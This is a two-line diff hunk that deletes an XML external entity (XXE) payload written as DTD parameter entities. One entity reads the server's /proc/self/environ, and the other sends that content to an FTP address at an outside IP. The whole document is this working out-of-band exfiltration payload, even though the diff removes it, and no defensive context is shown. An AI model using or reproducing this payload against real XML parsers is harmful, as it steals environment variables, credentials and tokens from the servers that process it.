@@ -1,2 +1,0 @@
-<!ENTITY % d SYSTEM "file:///proc/self/environ">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://99.97.214.141/%d;'>">
